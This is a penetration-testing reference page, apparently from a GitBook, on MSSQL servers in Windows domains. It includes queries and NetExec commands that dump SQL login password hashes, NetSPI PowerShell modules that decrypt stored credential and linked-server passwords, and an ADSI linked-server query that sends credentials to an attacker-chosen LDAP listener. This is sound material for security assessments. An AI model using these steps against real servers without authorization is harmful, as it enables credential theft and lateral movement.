# MSSQL DB - T1433,2433,U1434

{% hint style="info" %}
* MSSQL Servers are commonly deployed across Windows domains.
* They offer strong lateral movement potential since domain users can be mapped to database roles.
{% endhint %}

### Default Configuration

* When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as `NT SERVICE\MSSQLSERVER` .

### Dangerous Settings

* MSSQL clients not using encryption to connect to the MSSQL server
* The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
* The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
* Weak & default `sa` credentials. Admins may forget to disable this account

{% tab title="Manual" %}

* **Current execution context and sysadmin membership:**

```sql
SELECT ORIGINAL_LOGIN() AS original_login,
       SUSER_SNAME() AS execution_login,
       IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;

SELECT name, type_desc, is_disabled
FROM master.sys.server_principals
WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1
ORDER BY name;
```

* `IS_SRVROLEMEMBER`: `1` = member, `0` = not a member, `NULL` = unresolved/error. Results depend on metadata visibility; Windows group principals are not an expansion of every AD group member.

* **Security > Credentials:** server-level credential metadata; requires suitable metadata permissions (`VIEW ANY DEFINITION` or `ALTER ANY CREDENTIAL`, without a conflicting deny).

```sql
USE master;
SELECT credential_id, name, credential_identity,
       create_date, modify_date, target_type, target_id
FROM sys.credentials;

SELECT OBJECT_DEFINITION(OBJECT_ID(N'sys.credentials')) AS view_definition;
```

* These are external-resource identities, not SQL login password hashes. The view does not return secret values; a null definition can reflect metadata visibility.
* The supported view returns the fields from the supplied `sysclsobjs`/`sysobjvalues`/`syssingleobjrefs` join. Its internal `has_access(...)` implementation is not a portable user-query interface. [Catalog reference](https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-credentials-transact-sql).

#### Dedicated Administrator Connection (DAC)

* **Need:** SQL `sysadmin`; DAC is local-only by default and allows one session per instance. These commands target SQL Server instances, not Azure SQL Database.
* **Check the current setting and pending changes:** `RECONFIGURE` can apply other pending configuration changes too.

```sql
SELECT name, value, value_in_use
FROM sys.configurations
WHERE name = N'remote admin connections';

SELECT name, value, value_in_use
FROM sys.configurations
WHERE value <> value_in_use;
```

* **Enable remote DAC when needed:** record the original setting first; no SQL Server restart is normally required.

```sql
EXEC sys.sp_configure N'remote admin connections', 1;
RECONFIGURE;

SELECT name, value, value_in_use
FROM sys.configurations
WHERE name = N'remote admin connections';
```

* **Host terminal:** Windows integrated authentication or a SQL sysadmin login. With `-U` and no `-P`, `sqlcmd` prompts for the password.

```bat
sqlcmd -S "<server\instance>" -A -E -d master
sqlcmd -S "<server\instance>" -A -U "<sql-admin-login>" -d master
```

* **SSMS:** use a query-window connection, not Object Explorer; connect to `ADMIN:<server>` or `ADMIN:<server>\<instance>`. Disable IntelliSense for that connection to avoid consuming a second DAC session.
* **Connection failure:** DAC uses TCP 1434 or an instance-assigned TCP port, not SQL Browser's UDP 1434. Check the SQL error log and firewall; SQL Express normally requires startup trace flag `7806` for the listener.
* **Return to local-only DAC if the original value was `0`:**

```sql
EXEC sys.sp_configure N'remote admin connections', 0;
RECONFIGURE;
```

* `GO` is an SSMS/sqlcmd batch separator, not T-SQL; omit it when submitting through a database driver. [Microsoft DAC reference](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/diagnostic-connection-for-database-administrators).

### Exploitation

#### SQL Login Hashes

* **Need:** SQL permission to read password hashes: `CONTROL SERVER` on older versions; SQL Server 2022+ requires `VIEW ANY CRYPTOGRAPHICALLY SECURED DEFINITION`.
* **Existing SQL session:**

```sql
SELECT name, password_hash
FROM sys.sql_logins;
```

* **NetExec direct SQL:** `-d` uses Windows domain authentication; for a SQL login, replace it with `--local-auth`.

```sh
nxc mssql '<sql-host>' -u '<username>' -p '<password>' -d '<domain>' -q "SELECT name,CONVERT(varchar(max),password_hash,1) AS password_hash FROM sys.sql_logins" --log sql-login-hashes.txt
```

* **Built-in collection variant:** check `nxc mssql --help` for `--db-hash` in the installed release.

```sh
nxc mssql '<sql-host>' -u '<username>' -p '<password>' -d '<domain>' --db-hash
```

* **Through SMB command execution:** requires `sqlcmd` on the target. `-S` selects the instance; `-E` uses the remote process's Windows identity, which still needs SQL permissions.

```sh
nxc smb '<target-ip>' -u '<local-admin>' -p '<password>' --local-auth -x 'sqlcmd -S "<server\instance>" -E -Q "SELECT name,CONVERT(varchar(max),password_hash,1) AS password_hash FROM sys.sql_logins"' --log sql-login-hashes-via-smb.txt
```

* This returns SQL-authentication login hashes, not database contents or Windows password hashes. Null/limited output can reflect permissions. [SQL catalog reference](https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-sql-logins-transact-sql).

#### Stored Credential Passwords

* **Legacy internals via [DAC](#dedicated-administrator-connection-dac):** NetSPI identified credential ciphertext at `valclass=28`, `valnum=2`, in `imageval`. Verify the layout against the assessed SQL version.
* Use the credential name from `sys.credentials`; the query returns encrypted bytes, not plaintext passwords.

```sql
USE master;
SELECT credential.credential_id, credential.name,
       credential.credential_identity, stored.imageval AS encrypted_secret
FROM sys.credentials AS credential
JOIN sys.sysobjvalues AS stored ON stored.objid = credential.credential_id
WHERE stored.valclass = 28
  AND stored.valnum = 2
  AND credential.name = N'<credential-name>';
```

* **Internal target-type labels:** optional view-definition inspection, not credential extraction.

```sql
SELECT *
FROM master.sys.syspalvalues
WHERE class = 'SRCL';
```

* **Decrypt with NetSPI's module:** run locally on the SQL Windows host in elevated Windows PowerShell, with SQL sysadmin access and a free DAC slot. The module needs the machine's DPAPI material and instance registry entropy; ciphertext alone is insufficient.

```powershell
Import-Module .\Get-MSSQLCredentialPasswords.psm1
Get-MSSQLCredentialPasswords
```

* The original module enumerates installed local instances and has no instance-selection parameter. Published tests cover SQL Server 2008/2012; verify compatibility with newer versions.
* Source: [module](https://github.com/NetSPI/Powershell-Modules/blob/master/Get-MSSQLCredentialPasswords.psm1), [storage and decryption](https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-credential-passwords/).

**Stored Linked-Server Passwords**

* **Inspect login mappings:** these describe which identity is selected; they do not reveal its password.

```sql
SELECT name, provider, data_source
FROM sys.servers
WHERE is_linked = 1;

EXEC sys.sp_helplinkedsrvlogin @rmtsrvname = N'<linked-server>';
```

* **NetSPI decryption:** same local Windows administrator, SQL sysadmin, DPAPI, and DAC prerequisites as [stored credential passwords](#stored-credential-passwords).

```powershell
Import-Module .\Get-MSSQLLinkPasswords.psm1
Get-MSSQLLinkPasswords
```

* This module reads encrypted linked-login secrets from the internal `master.sys.syslnklgns.pwdhash` column; despite its name, this is ciphertext, not a crackable login hash. Integrated mappings need not contain a stored password.
* It enumerates local instances; published tests cover SQL Server 2005/2008/2012 and the listed Express versions. [Module](https://github.com/NetSPI/Powershell-Modules/blob/master/Get-MSSQLLinkPasswords.psm1), [research](https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-database-link-server-passwords/).

**ADSI / LDAP Authentication Variant**

* **Need:** an existing ADSI-provider linked server usable by the current login, a reachable test LDAP endpoint, and an LDAP listener that records bind requests.
* Substitute the actual link name; the LDAP URL in the query can select a destination different from the link's configured data source.

```sql
SELECT *
FROM OPENQUERY([<ADSI-linked-server>],
  'SELECT * FROM ''LDAP://<test-ldap-host>''');
```

* Inspect the bind type: the published cases used simple bind with mapped credentials, GSSAPI for a Windows-authenticated self-mapping, or attempted simple bind with the current SQL login in another configuration. TLS, mappings, and provider behavior affect what is observable.
* This is outbound authentication, not SMK decryption; sysadmin/local administrator access is not inherently required when a usable link already exists. [Tarlogic ADSI workflow](https://www.tarlogic.com/blog/linked-servers-adsi-passwords/).
